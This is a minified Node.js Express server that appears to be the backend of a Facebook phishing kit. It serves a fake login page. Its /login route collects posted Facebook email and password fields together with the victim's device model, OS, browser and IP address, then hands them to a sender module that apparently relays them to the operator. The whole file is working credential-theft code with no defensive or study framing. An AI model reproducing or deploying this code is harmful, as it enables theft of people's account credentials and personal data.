require("dotenv").config();let express=require("express"),path=require("path"),useragent=require("express-useragent"),requestIp=require("request-ip"),send3=require("./src/utils/sender3.js"),app=express(),PORT=process.env.PORT||3e3;app.use(express.urlencoded({extended:!0})),app.use(express.json()),app.use(useragent.express()),app.use(requestIp.mw()),app.use(express.static(path.join(__dirname,"public"))),app.get("/",(e,s)=>{s.sendFile(path.join(__dirname,"src","views","index.html"))}),app.get("/config",(e,s)=>{s.sendFile(path.join(__dirname,"src","data","config.json"))}),app.post("/login",(e,s)=>{var{emailFacebook:n,passwordFacebook:r,modelInfoFb:p,platformInfoFb:a,versiInfoFb:o,logFacebook:t}=e.body,i=e.useragent,n=n||"Unknown",r=r||"Unknown",p=p+` ${a} `+o||"Unknown",a=i.os||"Unknown",o=i.browser||"Unknown",i=e.clientIp||"Unknown",e=t||"Unknown";send3({emVal:n,passVal:r,device:p,os:a,browser:o,ipAddress:i,logVia:e}),s.sendStatus(200)}),app.use((e,s)=>{s.status(404).redirect("/")}),app.use((e,s,n,r)=>{console.error(e.stack),n.status(500).send("Terjadi kesalahan server.")}),app.listen(PORT,()=>{console.log("http://localhost:"+PORT)});